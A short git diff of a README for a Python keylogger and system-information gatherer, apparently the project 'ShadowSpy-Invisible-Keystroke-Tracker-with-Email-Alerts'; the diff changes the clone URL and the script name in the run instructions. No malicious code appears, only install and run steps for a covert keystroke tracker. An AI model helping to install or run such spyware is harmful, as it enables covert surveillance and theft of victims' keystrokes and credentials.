@@ -18,7 +18,7 @@ This Python script acts as a keylogger and system information gatherer. It captu
 1. Clone this repository:
 
    ```bash
-   git clone https://github.com/
+   git clone [https://github.com/](https://github.com/Al-Sowadi/ShadowSpy-Invisible-Keystroke-Tracker-with-Email-Alerts.git)
    cd 
    ```
 
@@ -38,7 +38,7 @@ This Python script acts as a keylogger and system information gatherer. It captu
 1. Run the script:
 
    ```bash
-   python main.py
+   python keyloggerWithAlartsAndSysInfo.py
    ```
 
 2. The keylogger and system information gathering will start in separate threads.
